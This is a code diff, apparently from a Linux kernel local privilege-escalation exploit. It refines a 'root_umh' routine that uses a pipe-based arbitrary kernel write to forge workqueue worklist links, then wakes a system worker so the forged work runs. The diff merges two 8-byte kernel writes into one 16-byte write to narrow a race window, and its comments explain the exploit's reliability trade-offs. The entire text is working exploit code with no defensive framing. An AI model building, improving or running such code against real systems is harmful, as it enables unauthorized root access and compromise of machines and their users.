@@ -97,10 +97,6 @@ static int pipe_read64(int fd, uint64_t target_addr, uint64_t *value) {
   return oss_pipe_rw_read(fd, target_addr, value, sizeof(*value));
 }
 
-static int pipe_write64(int fd, uint64_t target_addr, uint64_t value) {
-  return oss_pipe_rw_write(fd, target_addr, &value, sizeof(value));
-}
-
 static int wake_system_unbound(void) {
   char slave_name[128];
   int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
@@ -371,18 +367,20 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
     return 0;
   }
   int counters_write = 1;
-  int list_prev_write = pipe_write64(fd, worklist + sizeof(uint64_t), fake_entry);
-  if (!list_prev_write) {
-    /* The target write may have completed even if pipe-buffer restoration
-     * failed. Treat the first list-write attempt as irreversible. */
-    fprintf(stderr, "[root_umh] worklist prev write failed\n");
-    return 0;
-  }
-  int list_next_write = pipe_write64(fd, worklist, fake_entry);
-  if (!list_next_write) {
-    /* The list is already mutated. Concurrent workers may have observed it;
-     * blind rollback can corrupt a list that changed underneath us. */
-    fprintf(stderr, "[root_umh] worklist next write failed\n");
+  /* worklist.next (pool+0x20) and worklist.prev (pool+0x28) are adjacent
+   * list_head links. One 16-byte pipe write avoids a second forge/write/restore
+   * round trip and shortens the interval between updates. The kernel copy is
+   * not guaranteed atomic; a concurrent worker could still see one updated
+   * link before the other. */
+  uint64_t worklist_links[2] = {fake_entry, fake_entry};
+  int list_write =
+      oss_pipe_rw_write(fd, worklist, worklist_links, sizeof(worklist_links));
+  if (!list_write) {
+    /* The target copy may have partially completed even if pipe-buffer
+     * restoration reported failure; the list may already be mutated and a
+     * concurrent worker may have observed it, so blind rollback is unsafe.
+     * Treat the list write as irreversible. */
+    fprintf(stderr, "[root_umh] worklist link write failed\n");
     return 0;
   }
   int wake_ok = wake_system_unbound();
@@ -393,8 +391,8 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
           (unsigned long long)wq, (unsigned long long)pwq,
           (unsigned long long)pool, (unsigned long long)fake_work_addr,
           (unsigned long long)fake_entry, color, nr_inflight, nr_active,
-          refcnt, data_write, work_write, counters_write, list_prev_write,
-          list_next_write, (unsigned long long)snapshot_c.list_next,
+          refcnt, data_write, work_write, counters_write, list_write,
+          list_write, (unsigned long long)snapshot_c.list_next,
           (unsigned long long)snapshot_c.list_prev, snapshot_c.nr_idle,
           snapshot_c.nr_inflight, snapshot_c.nr_active, snapshot_c.refcnt);
   oss_diag_checkpoint("umh-queued");
